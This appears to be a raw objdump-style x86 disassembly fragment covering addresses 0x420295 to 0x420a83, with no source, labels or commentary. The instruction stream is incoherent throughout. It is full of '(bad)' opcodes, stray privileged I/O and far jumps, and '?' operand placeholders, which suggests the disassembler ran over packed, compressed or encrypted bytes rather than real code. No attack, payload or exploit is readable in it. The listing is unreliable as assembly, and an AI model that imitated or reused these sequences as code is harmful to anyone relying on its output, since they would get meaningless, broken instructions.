  420295:	psrld  mm5,QWORD PTR [edx+0x26d8462b]
  42029c:	mov    al,ds:0xde81193e
  4202a1:	mov    ecx,0x32668fe4
  4202a6:	ja     0x420264
  4202a8:	mov    edx,0x93a3b564
  4202ad:	icebp  
  4202ae:	jecxz  0x4202bc
  4202b0:	repnz enter 0x272c,0x97
  4202b5:	dec    edx
  4202b6:	pop    edx
  4202b7:	adc    BYTE PTR [esi-0x78457b8c],0x86
  4202be:	(bad)
  4202c1:	or     al,0xe1
  4202c3:	ror    al,0x58
  4202c6:	loopne 0x420302
  4202c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202c9:	cmp    ebp,edx
  4202cb:	lds    edi,FWORD PTR [ebx+0x70]
  4202ce:	xor    bl,BYTE PTR [edi]
  4202d0:	imul   esi,DWORD PTR [ebp+0x1cc801c7],0xffffffe1
  4202d7:	je     0x42025f
  4202d9:	sar    BYTE PTR [ebp+0x8e520c8],0x66
  4202e0:	jnp    0x4202bd
  4202e2:	fs push eax
  4202e4:	sub    bl,al
  4202e6:	push   edi
  4202e7:	pop    esi
  4202e8:	call   0x41b7:0xf46d52e
  4202ef:	add    eax,0xe8aa0786
  4202f4:	loope  0x420323
  4202f6:	arpl   WORD PTR [edx+0x2b],di
  4202f9:	lock aaa 
  4202fb:	inc    ecx
  4202fc:	and    al,0x36
  4202fe:	cmp    DWORD PTR [ebp-0x47],edx
  420301:	aas    
  420302:	mov    edx,0x830c80e4
  420307:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420308:	pop    ds
  420309:	out    0xc9,eax
  42030b:	push   esi
  42030c:	jnp    0x420314
  42030e:	cmp    al,BYTE PTR [ebp-0x6d]
  420311:	xchg   edx,eax
  420312:	cld    
  420313:	mov    bl,0x4
  420315:	jge    0x420389
  420317:	rcl    DWORD PTR [ebp+0x19b08840],1
  42031d:	mov    BYTE PTR [ecx+0xa2d4fe0],bl
  420323:	or     DWORD PTR [edi],ecx
  420325:	je     0x420335
  420327:	adc    ebx,DWORD PTR [ebx]
  420329:	add    BYTE PTR [edx-0x6f],bh
  42032c:	jg     0x420314
  42032e:	mov    eax,ds:0x5629bc4b
  420333:	sti    
  420334:	fcom   DWORD PTR [ebx-0x41828c17]
  42033a:	or     BYTE PTR [edx+0x6a339dd4],al
  420340:	mov    ?,WORD PTR [edx+0x56]
  420343:	xchg   ebx,esi
  420345:	(bad)  
  420346:	jae    0x420334
  420348:	push   ecx
  420349:	sahf   
  42034a:	jp     0x4202d0
  42034c:	jp     0x4202d0
  42034e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42034f:	les    esi,FWORD PTR [esi-0x79443320]
  420355:	sbb    DWORD PTR [eax],edx
  420357:	jecxz  0x420393
  420359:	add    BYTE PTR [ebx],dl
  42035b:	fucom  st(7)
  42035d:	and    eax,0x8c00e696
  420362:	mov    ds:0x88e91cad,eax
  420367:	pop    es
  420368:	mov    ebp,0xc52894f5
  42036d:	lds    ecx,FWORD PTR [esi+ebp*8-0x6bfbacbe]
  420374:	inc    ebx
  420375:	sar    BYTE PTR [esi+edx*1-0x2b],cl
  420379:	jle    0x42031f
  42037b:	mov    ecx,0x87bfa380
  420380:	ss sbb al,0x1d
  420383:	fwait
  420384:	mov    ebx,0x4a735e2a
  420389:	cmp    DWORD PTR [edx],eax
  42038b:	in     eax,0x49
  42038d:	jno    0x420331
  42038f:	data16 cli 
  420391:	adc    bh,BYTE PTR [ecx]
  420393:	jl     0x420348
  420395:	stc    
  420396:	stc    
  420397:	(bad)  
  420398:	mov    ebx,0x304f5327
  42039d:	lds    ecx,FWORD PTR [edi]
  42039f:	push   es
  4203a0:	clc    
  4203a1:	dec    edx
  4203a2:	cs jmp 0xb005:0x5bae17d4
  4203aa:	jno    0x42039c
  4203ac:	sbb    al,0x36
  4203ae:	cs loop 0x420382
  4203b1:	mov    ds:0x139eb6f3,al
  4203b6:	dec    BYTE PTR [eax]
  4203b8:	ja     0x420406
  4203ba:	das    
  4203bb:	ins    DWORD PTR es:[edi],dx
  4203bc:	retf   0x178c
  4203bf:	mov    ecx,0xec2cd5aa
  4203c4:	mov    WORD PTR [eax-0x16],?
  4203c7:	fwait
  4203c8:	je     0x42035c
  4203ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203cb:	fcomp  DWORD PTR [edx+0x5c52470a]
  4203d1:	add    DWORD PTR [ebp-0x3a],edi
  4203d4:	push   ebp
  4203d5:	stos   DWORD PTR es:[edi],eax
  4203d6:	xchg   esi,eax
  4203d7:	or     BYTE PTR [edx],0x78
  4203da:	lea    esi,ds:0x1720097a
  4203e0:	(bad)  
  4203e1:	sub    al,0x9
  4203e3:	repnz fadd DWORD PTR [esp+ecx*4]
  4203e7:	push   ecx
  4203e8:	ret    0x8584
  4203eb:	jl     0x420465
  4203ed:	fld    TBYTE PTR [edi]
  4203ef:	and    al,0x13
  4203f1:	ja     0x42039c
  4203f3:	jb     0x42039f
  4203f5:	inc    ebx
  4203f6:	shl    esp,0x90
  4203f9:	fisubr DWORD PTR [ebx+0x3112e7b3]
  4203ff:	sbb    DWORD PTR ds:0xbcff9789,edi
  420405:	inc    edi
  420406:	inc    esi
  420407:	add    BYTE PTR [ebx],0xce
  42040a:	inc    eax
  42040b:	test   eax,0x6b3d77c3
  420410:	jle    0x42046a
  420412:	push   es
  420413:	add    al,BYTE PTR [edx*4+0x1e1be0ad]
  42041a:	fidiv  WORD PTR [esi+0x2]
  42041d:	cmp    DWORD PTR ds:0xb2229484,esp
  420423:	add    BYTE PTR gs:[edx-0x4a],al
  420427:	xchg   esi,eax
  420428:	cli    
  420429:	xchg   edi,eax
  42042a:	add    al,0x86
  42042c:	out    0x39,al
  42042e:	bound  edx,QWORD PTR [eax]
  420430:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420431:	std    
  420432:	call   0x7f17:0xe8eb6b24
  420439:	sub    eax,0x58f0068e
  42043e:	sahf   
  42043f:	and    edi,0xd15e6f63
  420445:	(bad)  
  420446:	mov    bl,0xd3
  420448:	xchg   edi,eax
  420449:	xchg   ebx,eax
  42044a:	lds    ebx,FWORD PTR [ebx]
  42044c:	gs ins DWORD PTR es:[edi],dx
  42044e:	push   ecx
  42044f:	push   esi
  420450:	ins    DWORD PTR es:[edi],dx
  420451:	adc    bh,BYTE PTR [ebp+0x3]
  420454:	sbb    eax,0x910dff1a
  420459:	jo     0x42043b
  42045b:	shl    BYTE PTR [ecx],0xf4
  42045e:	vmwrite edi,DWORD PTR [ebp-0x561cd5a0]
  420465:	(bad)  
  420466:	xchg   DWORD PTR [esi+0x73dd984e],ecx
  42046c:	push   0x938453ec
  420471:	fistp  QWORD PTR [edx]
  420473:	dec    edi
  420474:	push   0x2
  420476:	arpl   bp,ax
  420478:	neg    ah
  42047a:	sub    ecx,DWORD PTR [ecx]
  42047c:	cmp    eax,0xe6163959
  420481:	xchg   ecx,eax
  420482:	cmp    BYTE PTR [ebx+0x6478c605],0xa8
  420489:	pop    eax
  42048a:	fimul  WORD PTR [esi-0xc]
  42048d:	in     eax,dx
  42048e:	lea    esi,[ebx+0x43]
  420491:	jle    0x420425
  420493:	repnz cli 
  420495:	imul   ebx,DWORD PTR [ebx-0x1d],0x6c74be8
  42049c:	sti    
  42049d:	xor    eax,0xcb3946c7
  4204a2:	lods   al,BYTE PTR ds:[esi]
  4204a3:	lea    ebp,[edx-0x68db4f5a]
  4204a9:	fwait
  4204aa:	pop    eax
  4204ab:	fmul   DWORD PTR [ebx]
  4204ad:	stos   DWORD PTR es:[edi],eax
  4204ae:	mov    eax,0xfd148e27
  4204b3:	or     eax,0x36cfea59
  4204b8:	data16 into 
  4204ba:	mov    ds:0x95e37aae,eax
  4204bf:	and    eax,0x1a39e00e
  4204c4:	call   0x21644bf2
  4204c9:	mov    ebp,0x234a6907
  4204ce:	aam    0xc8
  4204d0:	scas   eax,DWORD PTR es:[edi]
  4204d1:	rcl    BYTE PTR [ebx],cl
  4204d3:	not    DWORD PTR [esi+ecx*2+0x27d7f061]
  4204da:	into   
  4204db:	push   ecx
  4204dc:	xchg   ecx,eax
  4204dd:	(bad)  
  4204de:	cmp    eax,0x83acd416
  4204e3:	rcr    BYTE PTR [ecx-0x72],cl
  4204e6:	dec    edx
  4204e7:	or     DWORD PTR [eax+eiz*1+0x7c],0x2a
  4204ec:	sbb    al,0x4c
  4204ee:	jle    0x420491
  4204f0:	ror    cl,0xe9
  4204f3:	mov    ebx,0x663d0800
  4204f8:	out    0x1,eax
  4204fa:	leave  
  4204fb:	jle    0x420523
  4204fd:	and    dl,al
  4204ff:	sub    al,0xa8
  420501:	fmul   DWORD PTR [ebx-0x78]
  420504:	xchg   edx,eax
  420505:	icebp  
  420506:	xor    al,0xee
  420508:	or     eax,0xe05d88ad
  42050d:	arpl   WORD PTR [edi+0x3d3a0c3c],dx
  420513:	or     edx,DWORD PTR [ebp-0x706dc6d3]
  420519:	in     al,dx
  42051a:	cs pop ss
  42051c:	jge    0x420537
  42051e:	mov    ebx,0xdcfa5457
  420523:	lock lds esp,FWORD PTR [esi+eax*8]
  420527:	pop    eax
  420528:	(bad)  
  420529:	adc    dh,dh
  42052b:	stc    
  42052c:	mov    ds:0x6571b356,eax
  420531:	cli    
  420532:	push   edx
  420533:	jle    0x420576
  420535:	dec    ebp
  420536:	or     al,0xf4
  420538:	test   al,0xea
  42053a:	inc    ebp
  42053b:	fbld   TBYTE PTR [ebp+0x4a87253]
  420541:	(bad)  [ebx+0xa]
  420544:	pop    ebx
  420545:	mov    eax,ds:0x28a60c5d
  42054a:	cmp    eax,DWORD PTR [ebx-0x16]
  42054d:	lods   eax,DWORD PTR ds:[esi]
  42054e:	sub    BYTE PTR [esi+0x3f],ch
  420551:	and    bl,BYTE PTR [edi+ecx*8+0x5e91b4a0]
  420558:	in     eax,0x3
  42055a:	push   esi
  42055b:	and    al,0x99
  42055d:	in     eax,dx
  42055e:	mov    ebp,0x669eb4c1
  420563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420564:	xchg   ecx,eax
  420565:	lods   eax,DWORD PTR ds:[esi]
  420566:	jbe    0x420564
  420568:	jle    0x420555
  42056a:	sbb    al,0x65
  42056c:	jmp    0x42056f
  42056e:	in     eax,dx
  42056f:	mov    dh,0xdc
  420571:	add    eax,0x31e35b79
  420576:	mov    cl,0x85
  420578:	retf   0x48ad
  42057b:	add    ah,bh
  42057d:	icebp  
  42057e:	pusha  
  42057f:	xchg   esi,eax
  420580:	outs   dx,DWORD PTR ds:[esi]
  420581:	popa   
  420582:	dec    ecx
  420583:	int3   
  420584:	jne    0x4205cb
  420586:	scas   eax,DWORD PTR es:[edi]
  420587:	bound  ebp,QWORD PTR [esi+ecx*8-0x72]
  42058b:	dec    esi
  42058c:	imul   eax,DWORD PTR [ebp+0x5c1a98b3],0xffffffb6
  420593:	and    eax,DWORD PTR [edi-0x2]
  420596:	aad    0xb7
  420598:	mov    ebp,DWORD PTR [eax]
  42059a:	leave  
  42059b:	sub    ah,BYTE PTR [eax+0x71cd4c0f]
  4205a1:	iret   
  4205a2:	inc    ebp
  4205a3:	xchg   DWORD PTR [esi+0x7996809a],ebp
  4205a9:	ss clc 
  4205ab:	mov    al,ds:0xe84b9ff3
  4205b0:	int3   
  4205b1:	mov    edx,0xfb78987
  4205b6:	aad    0xdc
  4205b8:	mov    edx,eax
  4205ba:	in     al,0x84
  4205bc:	cmp    ebp,0x5
  4205bf:	mov    dl,0xf5
  4205c1:	and    DWORD PTR [ecx+edi*4+0x52],edx
  4205c5:	stos   DWORD PTR es:[edi],eax
  4205c6:	(bad)  
  4205c7:	sbb    ah,BYTE PTR [ecx-0x1c]
  4205ca:	mov    ah,0x2c
  4205cc:	adc    eax,0xd0390f94
  4205d1:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205d3:	cli    
  4205d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205d5:	sbb    ecx,ebx
  4205d7:	pop    ds
  4205d8:	inc    eax
  4205d9:	mov    ?,WORD PTR [edx+esi*1+0x48]
  4205dd:	mov    WORD PTR [ebp-0x41415e02],ss
  4205e3:	scas   eax,DWORD PTR es:[edi]
  4205e4:	jne    0x4205e2
  4205e6:	sbb    BYTE PTR [eax+0xd9517dd],0x8c
  4205ed:	test   eax,0x3909728d
  4205f2:	outs   dx,BYTE PTR ds:[esi]
  4205f3:	loope  0x42060e
  4205f5:	lods   al,BYTE PTR ds:[esi]
  4205f6:	and    ch,BYTE PTR [ebx+0x26]
  4205f9:	loop   0x4205be
  4205fb:	out    dx,al
  4205fc:	retf   
  4205fd:	(bad)  
  4205fe:	(bad)  
  4205ff:	aas    
  420600:	xlat   BYTE PTR ds:[ebx]
  420601:	bound  ebx,QWORD PTR ds:0xe6cf947b
  420607:	jbe    0x42064d
  420609:	adc    edx,esi
  42060b:	lods   eax,DWORD PTR ds:[esi]
  42060c:	adc    esp,esp
  42060e:	in     al,dx
  42060f:	ror    BYTE PTR [edx+0x21],1
  420612:	jae    0x420671
  420614:	mov    edx,0x524a0331
  420619:	xchg   DWORD PTR [ebx+0x3afd04cb],ebx
  42061f:	jp     0x4205d9
  420621:	cmp    eax,0x6fce738
  420626:	push   cs
  420627:	and    eax,DWORD PTR [eax-0x65]
  42062a:	cmp    ecx,DWORD PTR [eax]
  42062c:	xchg   edi,eax
  42062d:	out    dx,eax
  42062e:	xchg   BYTE PTR [esi+0x5f],ah
  420631:	dec    esp
  420632:	inc    eax
  420633:	xor    ebp,DWORD PTR [edi]
  420635:	push   ebx
  420636:	ss push ds
  420638:	test   BYTE PTR [edi],bl
  42063a:	pop    ebp
  42063b:	iret   
  42063c:	or     dl,BYTE PTR [eax-0x9]
  42063f:	jne    0x42068c
  420641:	cmp    esi,esp
  420643:	sub    esp,DWORD PTR [eax+ebx*4+0x5e]
  420647:	jge    0x4206c0
  420649:	xor    esp,DWORD PTR [eax+0xc1bba46]
  42064f:	mov    ebp,0x299dd882
  420654:	rol    BYTE PTR [edi+esi*8+0x55c3770a],1
  42065b:	(bad)  
  42065c:	pop    esi
  42065d:	push   es
  42065e:	(bad)  
  42065f:	out    0xf2,eax
  420661:	cli    
  420662:	out    dx,al
  420663:	lahf   
  420664:	jmp    0xef5c:0xabb8cd76
  42066b:	and    ah,BYTE PTR [edx-0x7a]
  42066e:	aad    0xd3
  420670:	sar    DWORD PTR [edi],cl
  420672:	dec    edx
  420673:	ss pop ebp
  420675:	push   0xfe5d2245
  42067a:	adc    BYTE PTR [edx+0x42],0x83
  42067e:	fisubr WORD PTR [ebp-0x7a]
  420681:	in     eax,0x5
  420683:	jge    0x4206fe
  420685:	push   ds
  420686:	mov    dl,cl
  420688:	add    BYTE PTR [esi-0x58e8fa50],bh
  42068e:	in     al,dx
  42068f:	jmp    0x27078867
  420694:	adc    DWORD PTR [esi-0x7e],edi
  420697:	mov    BYTE PTR [edi+0x7bedf2f1],al
  42069d:	ror    BYTE PTR [esi+0x610d3f77],cl
  4206a3:	or     eax,0x40d24bf0
  4206a8:	mov    WORD PTR [edi+0x5134919f],fs
  4206ae:	loope  0x42067e
  4206b0:	lods   eax,DWORD PTR ds:[esi]
  4206b1:	xchg   esi,eax
  4206b2:	data16 loope 0x420658
  4206b5:	jp     0x420723
  4206b7:	fist   WORD PTR [ebp-0x7c]
  4206ba:	mov    ebp,0xeddea62d
  4206bf:	fmul   st(6),st
  4206c1:	sub    eax,0x3f275dde
  4206c6:	adc    ebx,DWORD PTR [ecx]
  4206c8:	or     DWORD PTR [ecx-0x478451eb],ebx
  4206ce:	call   0x5c7fd1fd
  4206d3:	xor    edx,DWORD PTR [ebx-0x44bb2819]
  4206d9:	lahf   
  4206da:	jbe    0x4206cf
  4206dc:	inc    eax
  4206dd:	mov    ah,0xf4
  4206df:	int3   
  4206e0:	cmp    dh,BYTE PTR [edx+0x58823e1b]
  4206e6:	jnp    0x4206f7
  4206e8:	sar    BYTE PTR [ebx],0xd2
  4206eb:	pop    edx
  4206ec:	xor    ebp,DWORD PTR [edi-0x3dacb0b2]
  4206f2:	mov    esp,0x28a667e8
  4206f7:	ins    DWORD PTR es:[edi],dx
  4206f8:	pop    ebp
  4206f9:	repz jmp 0x4206a6
  4206fc:	cmc    
  4206fd:	cld    
  4206fe:	lods   eax,DWORD PTR ds:[esi]
  4206ff:	jle    0x420763
  420701:	aaa    
  420702:	cmp    dh,dh
  420704:	jl     0x420773
  420706:	and    al,0x76
  420708:	idiv   DWORD PTR [esi]
  42070a:	jg     0x420709
  42070c:	jno    0x4206ef
  42070e:	or     DWORD PTR [ecx],esp
  420710:	call   0xa28a423c
  420715:	test   DWORD PTR [edi-0x213a1d12],ecx
  42071b:	xlat   BYTE PTR ds:[ebx]
  42071c:	mov    dh,0x83
  42071e:	push   edx
  42071f:	jne    0x42076b
  420721:	add    BYTE PTR [edx+eiz*4-0x3b],0xcd
  420726:	shl    BYTE PTR [ebp+0x4e5fd7c7],1
  42072c:	xchg   edx,eax
  42072d:	lahf   
  42072e:	cli    
  42072f:	and    DWORD PTR [eax+0x5f],ebp
  420732:	cmp    BYTE PTR ds:0xfc208fb2,0xfe
  420739:	jp     0x4206d7
  42073b:	sub    DWORD PTR ds:0x7e3c9685,eax
  420741:	cld    
  420742:	pop    ss
  420743:	fs iret 
  420745:	jmp    0x420751
  420747:	ins    DWORD PTR es:[edi],dx
  420748:	ja     0x4207ad
  42074a:	push   0xffffffad
  42074c:	mov    dl,0x65
  42074e:	clc    
  42074f:	push   ebp
  420750:	ja     0x42075f
  420752:	(bad)  
  420753:	rcl    BYTE PTR [ebx+0x11],1
  420756:	jo     0x4207c6
  420758:	lock mov al,al
  42075b:	ss jo  0x4207cc
  42075e:	stc    
  42075f:	mov    esi,0xb430bf53
  420764:	inc    ecx
  420765:	cmp    edi,esi
  420767:	xor    DWORD PTR [eax-0x1e6e3456],ebx
  42076d:	idiv   ebp
  42076f:	pushf  
  420770:	into   
  420771:	stos   DWORD PTR es:[edi],eax
  420772:	(bad)  
  420773:	mov    edx,0xc2ec595a
  420778:	sbb    al,0xc1
  42077a:	push   ss
  42077b:	ins    DWORD PTR es:[edi],dx
  42077c:	dec    ebx
  42077d:	pop    esp
  42077e:	add    BYTE PTR [ecx],cl
  420780:	lods   al,BYTE PTR ds:[esi]
  420781:	dec    DWORD PTR [ecx]
  420783:	aad    0x70
  420785:	mov    ds:0x8ef8fe50,al
  42078a:	pop    esi
  42078b:	rcr    DWORD PTR [edi+ebp*1],cl
  42078e:	(bad)  
  42078f:	adc    al,0xa7
  420791:	inc    ecx
  420792:	pusha  
  420793:	mov    ebx,0xf980b4bb
  420798:	pop    ss
  420799:	aad    0xc8
  42079b:	jge    0x4207bb
  42079d:	stos   DWORD PTR es:[edi],eax
  42079e:	pop    esp
  42079f:	into   
  4207a0:	int    0x99
  4207a2:	xor    BYTE PTR [edi-0x31],bh
  4207a5:	aad    0xef
  4207a7:	call   0xe245aa65
  4207ac:	and    ecx,DWORD PTR [ebp+ebx*8-0x6a256ea]
  4207b3:	call   0xb761879d
  4207b8:	xor    eax,0x118d7c91
  4207bd:	div    DWORD PTR [eax-0x416851ad]
  4207c3:	cmc    
  4207c4:	sbb    al,0xd3
  4207c6:	call   0x370f:0x77df9b10
  4207cd:	scas   eax,DWORD PTR es:[edi]
  4207ce:	push   0x444ce130
  4207d3:	jns    0x420760
  4207d5:	jae    0x420809
  4207d7:	inc    ebp
  4207d8:	pop    edi
  4207d9:	or     ebx,DWORD PTR [esi-0x19d6325e]
  4207df:	in     al,dx
  4207e0:	cdq    
  4207e1:	fbstp  TBYTE PTR [esi+ebx*4]
  4207e4:	clc    
  4207e5:	lahf   
  4207e6:	mov    esi,ebx
  4207e8:	jns    0x4207ff
  4207ea:	sub    DWORD PTR [edx-0x1],edi
  4207ed:	mov    edx,0xbecf576
  4207f2:	repnz test eax,0x6a266c1f
  4207f8:	mov    esi,0xbdacb797
  4207fd:	xor    ecx,DWORD PTR [edi+0x26]
  420800:	add    eax,0xbf9a4f31
  420805:	sub    ch,BYTE PTR [edi+0x62]
  420808:	(bad)  
  420809:	sbb    cl,dl
  42080b:	adc    eax,0x27de7cfb
  420810:	sar    ecx,1
  420812:	out    0xe3,al
  420814:	xor    ch,BYTE PTR [ebx]
  420816:	ficom  WORD PTR [ebp+0x5a]
  420819:	bound  eax,QWORD PTR [ebx+0x7a0922d7]
  42081f:	mov    ds:0x34add255,eax
  420824:	add    BYTE PTR [eax],al
  420826:	add    BYTE PTR [eax],al
  420828:	add    BYTE PTR [eax],al
  42082a:	inc    esp
  42082b:	dec    ebp
  42082c:	dec    edx
  42082d:	dec    ebx
  42082e:	dec    ebx
  42082f:	dec    edi
  420830:	inc    ebp
  420831:	dec    edi
  420832:	sub    eax,0xb104921e
  420837:	xchg   esp,eax
  420838:	push   ecx
  420839:	and    DWORD PTR [eax-0x69],ebx
  42083c:	add    DWORD PTR [eax],eax
  42083e:	add    BYTE PTR [esi],0x0
  420841:	add    BYTE PTR [esi+eax*8-0x28],dh
  420845:	fsubrp st(4),st
  420847:	mov    bl,0x69
  420849:	test   ecx,0xa07e3c78
  42084f:	cld    
  420850:	pop    ebx
  420851:	jl     0x4208c5
  420853:	imul   edi,DWORD PTR [esi-0x71],0xdeeeb78d
  42085a:	mov    bh,0xb6
  42085c:	imul   esp,DWORD PTR [edx-0x7c9a4454],0x30
  420863:	mov    ebp,0xea572798
  420868:	cmp    BYTE PTR [esi+0x6ba1f605],dh
  42086e:	xchg   BYTE PTR [ecx+0x5c],bh
  420871:	out    dx,eax
  420872:	bound  eax,QWORD PTR [ebx+0x7739b928]
  420878:	pop    esp
  420879:	pop    ecx
  42087a:	mov    ds:0xb893e5dd,al
  42087f:	mov    ecx,0x9ca880bf
  420884:	cmc    
  420885:	adc    al,0x2d
  420887:	loop   0x4208af
  420889:	(bad)  
  42088b:	and    al,BYTE PTR [ebx+0x6]
  42088e:	mov    ds:0x66e1dc5e,al
  420893:	(bad)  
  420895:	xchg   esi,ecx
  420897:	cwde   
  420898:	scas   eax,DWORD PTR es:[edi]
  420899:	ins    BYTE PTR es:[edi],dx
  42089a:	pop    esi
  42089b:	push   esi
  42089c:	popf   
  42089d:	lahf   
  42089e:	jle    0x42091e
  4208a0:	and    BYTE PTR [ebx-0xded1946],bl
  4208a6:	out    dx,al
  4208a7:	jg     0x420868
  4208a9:	mov    bh,0x93
  4208ab:	or     eax,0xc6dcf786
  4208b0:	retf   0x229a
  4208b3:	test   BYTE PTR [eax-0x49f97998],bl
  4208b9:	xor    BYTE PTR [edx+0x1f32eec4],dl
  4208bf:	hlt    
  4208c0:	arpl   WORD PTR [ecx+eiz*2],sp
  4208c3:	out    0x95,eax
  4208c5:	ins    DWORD PTR es:[edi],dx
  4208c6:	xor    ebx,ebp
  4208c8:	in     al,dx
  4208c9:	jmp    0x5a67:0x6ab57ad6
  4208d0:	fistp  DWORD PTR [edx]
  4208d2:	in     al,0x6f
  4208d4:	xchg   edx,eax
  4208d5:	pop    ss
  4208d6:	cmp    ecx,DWORD PTR [eax]
  4208d8:	pop    eax
  4208d9:	push   esi
  4208da:	inc    ebp
  4208db:	ins    DWORD PTR es:[edi],dx
  4208dc:	add    ah,dl
  4208de:	test   al,0x25
  4208e0:	push   esp
  4208e1:	fcomip st,st(2)
  4208e3:	pusha  
  4208e4:	test   al,0x89
  4208e6:	jl     0x4208fb
  4208e8:	push   eax
  4208e9:	jl     0x420878
  4208eb:	sub    al,0x35
  4208ed:	aaa    
  4208ee:	xlat   BYTE PTR ds:[ebx]
  4208ef:	mov    ds:0x26be1ee5,al
  4208f4:	push   0x2753a41
  4208f9:	mov    ds:0x393a187a,eax
  4208fe:	mov    ds:0xac954518,eax
  420903:	sub    edi,edi
  420905:	arpl   WORD PTR [edx],ax
  420907:	ret    0xd279
  42090a:	leave  
  42090b:	xchg   esp,eax
  42090c:	adc    DWORD PTR [ebp+0x1e602480],ebx
  420912:	add    edi,esi
  420914:	push   esp
  420915:	fwait
  420916:	pop    eax
  420917:	jg     0x4208f8
  420919:	and    eax,0x5ebd111d
  42091e:	jae    0x4208f8
  420920:	stc    
  420921:	(bad)  
  420923:	or     ah,BYTE PTR [ecx]
  420925:	in     al,dx
  420926:	scas   al,BYTE PTR es:[edi]
  420927:	sbb    esi,ebp
  420929:	out    0x55,al
  42092b:	xchg   esi,eax
  42092c:	jbe    0x4208b7
  42092e:	add    ch,ah
  420930:	adc    esi,edi
  420932:	jne    0x420963
  420934:	adc    eax,0x6d672e90
  420939:	adc    DWORD PTR [edi],ebp
  42093b:	xchg   esp,eax
  42093c:	sbb    esi,DWORD PTR [edi-0x2eeaffda]
  420942:	int3   
  420943:	out    0x6e,eax
  420945:	inc    ebx
  420946:	add    al,0x69
  420948:	cmp    dh,BYTE PTR [edx+0x3f01ce93]
  42094e:	idiv   DWORD PTR [edx-0xd]
  420951:	fnstsw WORD PTR [edi]
  420953:	sar    BYTE PTR [edi-0x27abdd27],cl
  420959:	sahf   
  42095a:	push   edx
  42095b:	cld    
  42095c:	aad    0x27
  42095e:	mov    bl,cl
  420960:	das    
  420961:	jno    0x4209df
  420963:	xor    bh,al
  420965:	mov    dl,bh
  420967:	and    eax,0xc909e015
  42096c:	push   ebx
  42096d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42096e:	int    0x4e
  420970:	xor    BYTE PTR [ebp+edi*8-0x39f89340],bh
  420977:	jns    0x42095f
  420979:	sbb    dl,BYTE PTR ds:0x3cfec1a9
  42097f:	sbb    eax,0xcffd8c41
  420984:	fs stos BYTE PTR es:[edi],al
  420986:	xor    ebx,DWORD PTR [ebp-0x61]
  420989:	fdivr  QWORD PTR [ecx+ecx*1-0x69d96495]
  420990:	and    ch,al
  420992:	sbb    BYTE PTR [ecx],al
  420994:	pop    es
  420995:	dec    eax
  420996:	or     DWORD PTR [ebx-0x61],edx
  420999:	xor    BYTE PTR [edi-0x15],0xc3
  42099d:	neg    BYTE PTR [eax+0x62]
  4209a0:	sub    dl,BYTE PTR [edx+0x398ffa27]
  4209a6:	mov    bh,ah
  4209a8:	add    esi,DWORD PTR [edi+0x1e52ece1]
  4209ae:	mov    WORD PTR [edi-0x32],?
  4209b1:	mov    WORD PTR ds:0x9329c85,es
  4209b7:	xor    bl,BYTE PTR ss:[eax]
  4209ba:	mov    al,0x58
  4209bc:	mov    ecx,eax
  4209be:	addr16 inc ecx
  4209c0:	loopne 0x420983
  4209c2:	fwait
  4209c3:	inc    ebp
  4209c4:	inc    edx
  4209c5:	inc    ebx
  4209c6:	xor    eax,0x23662fe1
  4209cb:	sbb    edi,DWORD PTR [ebx+0x277e473c]
  4209d1:	icebp  
  4209d2:	mov    al,ds:0x30da7c54
  4209d7:	sbb    eax,0xf95c2eb7
  4209dc:	lahf   
  4209dd:	imul   BYTE PTR [edx]
  4209df:	call   0x683f:0xb4b8670e
  4209e6:	jge    0x42096a
  4209e8:	jge    0x420a1f
  4209ea:	fmul   DWORD PTR [esi]
  4209ec:	mov    ds:0x673d8101,al
  4209f1:	push   esi
  4209f2:	ja     0x42098f
  4209f4:	inc    ebp
  4209f5:	iret   
  4209f6:	test   DWORD PTR [edi-0x67],0x2971f361
  4209fd:	xor    ah,ch
  4209ff:	jae    0x4209df
  420a01:	fxch   st(3)
  420a03:	sub    DWORD PTR [esi+eax*8-0xacec52f],0x7
  420a0b:	adc    BYTE PTR [ecx+0x33],dl
  420a0e:	jnp    0x42099a
  420a10:	mov    BYTE PTR [ecx],cl
  420a12:	(bad)  
  420a13:	(bad)  
  420a14:	call   0x303610a
  420a19:	stc    
  420a1a:	and    ecx,0x5565bb57
  420a20:	or     DWORD PTR [edx-0x32f9b818],ebx
  420a26:	inc    ecx
  420a27:	jns    0x420a59
  420a29:	xor    al,0x60
  420a2b:	icebp  
  420a2c:	mov    ecx,0x476a31a4
  420a31:	outs   dx,BYTE PTR ds:[esi]
  420a32:	leave  
  420a33:	and    DWORD PTR [esi+0x5c501106],edx
  420a39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a3a:	stos   BYTE PTR es:[edi],al
  420a3b:	fld    QWORD PTR [edx]
  420a3d:	jnp    0x420aaf
  420a3f:	and    BYTE PTR [esp+edi*2],dh
  420a42:	loop   0x420ab7
  420a44:	pop    eax
  420a45:	ins    BYTE PTR es:[edi],dx
  420a46:	outs   dx,BYTE PTR ds:[esi]
  420a47:	cmp    al,0xe5
  420a49:	pusha  
  420a4a:	xchg   BYTE PTR [edx+0x63],cl
  420a4d:	or     bh,BYTE PTR [eax+0x7c]
  420a50:	lods   eax,DWORD PTR ds:[esi]
  420a51:	hlt    
  420a52:	inc    ebx
  420a53:	sahf   
  420a54:	dec    eax
  420a55:	jbe    0x4209e5
  420a57:	mov    ebx,0xc7613f0a
  420a5c:	add    al,BYTE PTR [edi+0x23]
  420a5f:	iret   
  420a60:	pop    ebx
  420a61:	jb     0x420a3c
  420a63:	mov    ss,WORD PTR [edi+0x2085c056]
  420a69:	sub    al,0x4b
  420a6b:	mov    gs,ebp
  420a6d:	sbb    BYTE PTR [edi],ah
  420a6f:	xchg   esp,eax
  420a70:	mov    ah,ch
  420a72:	js     0x420aeb
  420a74:	ja     0x420a93
  420a76:	sahf   
  420a77:	inc    ebx
  420a78:	pusha  
  420a79:	ficomp WORD PTR [ebp+0x7d]
  420a7c:	dec    esp
  420a7d:	(bad)  
  420a7e:	lods   al,BYTE PTR ds:[esi]
  420a7f:	sbb    al,0x57
  420a81:	(bad)  
  420a82:	cwde   
  420a83:	lds    ebp,FWORD PTR [ebp-0x36aa9b9b]
